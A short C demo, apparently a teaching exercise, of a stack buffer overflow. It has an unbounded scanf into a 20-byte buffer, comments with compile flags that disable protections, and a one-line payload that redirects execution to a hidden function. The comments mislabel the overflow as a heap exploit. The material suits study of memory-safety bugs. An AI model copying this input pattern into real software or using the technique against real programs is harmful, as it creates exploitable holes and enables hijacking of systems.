#include <stdio.h>

void secretFunction()
{
    printf("Congratulations!\n");
    printf("You have entered in the secret function!\n");
    printf("Let's find here a Reverse shell .. ie \n");
}

void echo()
{
    char buffer[20];
    printf("Enter some text:\n");
    scanf("%s", buffer);
    printf("You entered: %s\n", buffer);
}

int main()
{
    echo();
    return 0;
}

// https://stackoverflow.com/questions/2340259/how-to-turn-off-gcc-compiler-optimization-to-enable-buffer-overflow
// https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
// to compile : $ gcc demo-heap.c -o vuln -m32 -fno-stack-protector -z execstack -no-pie
// exploit heap  = $ python -c 'print "a"*32 + "\x8b\x84\x04\x08"' | ./vuln
// OUtput
/*
    You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
    Congratulations!
    You have entered in the secret function!
    Let's find here a Reverse shell .. ie
    Erreur de segmentation
 */

/*
 * secretFunction address (hidra) = 0804848b
 */